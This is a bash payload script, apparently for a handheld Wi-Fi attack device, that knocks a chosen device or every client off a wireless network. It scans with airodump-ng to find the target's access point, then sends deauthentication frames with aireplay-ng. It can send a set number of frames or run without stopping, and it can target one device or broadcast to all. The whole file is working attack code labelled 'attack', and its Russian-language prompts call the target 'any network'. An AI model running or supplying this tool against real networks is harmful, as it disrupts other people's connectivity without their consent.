#!/bin/bash
# Title: Targeted Deauth
# Author: bad-antics
# Description: Deauthenticate a specific MAC address from any network
# Category: nullsec/attack

# Autodetect the right wireless interface (exports $IFACE).
# Falls back to showing the pager error dialog if nothing is plugged in.
. /root/payloads/library/nullsec-iface.sh 2>/dev/null || . "$(dirname "$0")/../../../lib/nullsec-iface.sh"
nullsec_require_iface || exit 1

PROMPT "ЦЕЛЕВАЯ ДЕАУТЕНТИФИКАЦИЯ

Отключить конкретное
устройство из ЛЮБОЙ сети.

Введите MAC целевого
устройства.

Нажмите OK для настройки."

TARGET_MAC=$(MAC_PICKER "MAC целевого устройства:")
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) 
    ERROR_DIALOG "Требуется MAC!"
    exit 1
    ;;
esac

PROMPT "НАЙТИ ЦЕЛЕВУЮ СЕТЬ

1. Автосканирование
2. Ввести BSSID вручную
3. Вещание (все сети)

Выберите вариант."

MODE=$(NUMBER_PICKER "Режим (1-3):" 1)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) MODE=1 ;; esac

BSSID=""
CHANNEL=""

if [ "$MODE" -eq 1 ]; then
    SPINNER_START "Сканирование цели..."
    timeout 15 airodump-ng $IFACE --write-interval 1 -w /tmp/targetscan --output-format csv 2>/dev/null
    SPINNER_STOP
    
    # Find which AP the target is connected to
    BSSID=$(grep -i "$TARGET_MAC" /tmp/targetscan*.csv 2>/dev/null | head -1 | cut -d',' -f6 | tr -d ' ')
    CHANNEL=$(grep -i "$BSSID" /tmp/targetscan*.csv 2>/dev/null | head -1 | cut -d',' -f4 | tr -d ' ')
    
    if [ -z "$BSSID" ]; then
        ERROR_DIALOG "Цель не найдена!

MAC: $TARGET_MAC
Не подключена ни к какой AP.

Попробуйте ручной ввод BSSID."
        exit 1
    fi
    
    PROMPT "ЦЕЛЬ НАЙДЕНА!

Устройство: $TARGET_MAC
Подключено к: $BSSID
Канал: $CHANNEL

Нажмите OK для продолжения."

elif [ "$MODE" -eq 2 ]; then
    BSSID=$(MAC_PICKER "BSSID целевой AP:")
    CHANNEL=$(NUMBER_PICKER "Канал (1-14):" 6)
elif [ "$MODE" -eq 3 ]; then
    BSSID="FF:FF:FF:FF:FF:FF"
    CHANNEL=$(NUMBER_PICKER "Канал (1-14):" 6)
fi

PACKETS=$(NUMBER_PICKER "Пакеты деаутентификации:" 100)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) PACKETS=100 ;; esac

CONTINUOUS=$(CONFIRMATION_DIALOG "Непрерывный режим?

Посылать деаутентификации
до остановки?"

resp=$(CONFIRMATION_DIALOG "ЗАПУСТИТЬ АТАКУ?

Цель: $TARGET_MAC
BSSID: $BSSID
Канал: $CHANNEL
Пакеты: $PACKETS

Нажмите OK для атаки."
[ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ] && exit 0

iwconfig $IFACE channel $CHANNEL 2>/dev/null

LOG "Деаутентификация $TARGET_MAC..."

if [ "$CONTINUOUS" = "$DUCKYSCRIPT_USER_CONFIRMED" ]; then
    aireplay-ng -0 0 -a "$BSSID" -c "$TARGET_MAC" $IFACE &
    DEAUTH_PID=$!
    
    PROMPT "ДЕАУТЕНТИФИКАЦИЯ АКТИВНА

Цель: $TARGET_MAC
Режим: Непрерывный

Нажмите OK для ОСТАНОВКИ."
    
    kill $DEAUTH_PID 2>/dev/null
else
    aireplay-ng -0 $PACKETS -a "$BSSID" -c "$TARGET_MAC" $IFACE
fi

PROMPT "ДЕАУТЕНТИФИКАЦИЯ ЗАВЕРШЕНА

Цель: $TARGET_MAC
Отправлено пакетов: $PACKETS

Нажмите OK для выхода."
